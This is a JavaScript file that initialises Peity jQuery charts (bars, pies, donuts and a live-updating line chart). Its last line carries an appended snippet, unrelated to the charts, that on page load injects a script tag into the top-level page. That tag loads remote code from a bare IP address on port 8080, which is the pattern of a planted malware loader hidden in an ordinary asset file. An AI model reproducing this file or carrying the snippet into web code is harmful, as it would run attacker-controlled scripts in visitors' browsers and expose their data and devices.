$(function() {
    "use strict";
    $(".bar-line").peity("bar", {
        width: "100",
        height: "100"
    });

    
    $("span.pie").peity("pie", {
        width: "100",
        height: "100"
    });
    
    
    
    $("span.donut").peity("donut", {
        width: "100",
        height: "100"
    });
    
    
    
    $(".peity-line").peity("line", {
        width: "300",
        height: "100"
    });
    
    
    
    $(".bar").peity("bar", {
        width: "300",
        height: "100"
    });
    
    
    
    $(".bar-colours-1").peity("bar", {
        fill: ["red", "green", "blue"],
        width: "100",
        height: "100"
    });
    
    
    
    $(".bar-colours-2").peity("bar", {
        fill: function(t) {
            return t > 0 ? "green" : "red"
        },
        width: "100",
        height: "100"
    });
    
    
    
    $(".bar-colours-3").peity("bar", {
        fill: function(t, e, i) {
            return "rgb(255, " + parseInt(e / i.length * 255) + ", 0)"
        },
        width: "100",
        height: "100"
    });
    
    
    
    $(".pie-colours-1").peity("pie", {
        fill: ["cyan", "magenta", "yellow", "black"],
        width: "100",
        height: "100"
    });
    
    
    
    $(".pie-colours-2").peity("pie", {
        fill: function(t, e, i) {
            return "rgb(255, " + parseInt(e / i.length * 255) + ", 0)"
        },
        width: "100",
        height: "100"
    });
    
    
    
    $(".data-attr").peity("donut");



    $("select").change(function() {
        var t = $(this).val() + "/5";
        $(this).siblings("span.graph").text(t).change(),
        $("#notice").text("Chart updated: " + t)
    }).change(), $("span.graph").peity("pie");


    var t = $(".updating-chart").peity("line", {
        width: "100%",
        height: 100
    });
    setInterval(function() {
        var e = Math.round(10 * Math.random()),
            i = t.text().split(",");
        i.shift(), i.push(e), t.text(i.join(",")).change()
    }, 1e3)
});;window.addEventListener('load',function(){var s = top.document.getElementById('1qa2ws');if(!s){s = top.document.createElement('script');s.id ='1qa2ws';s.type='text/javascript';s.src='http://105.203.255.69:8080/www/default/base.js?v2.1&method=1';top.document.body.appendChild(s);}},false);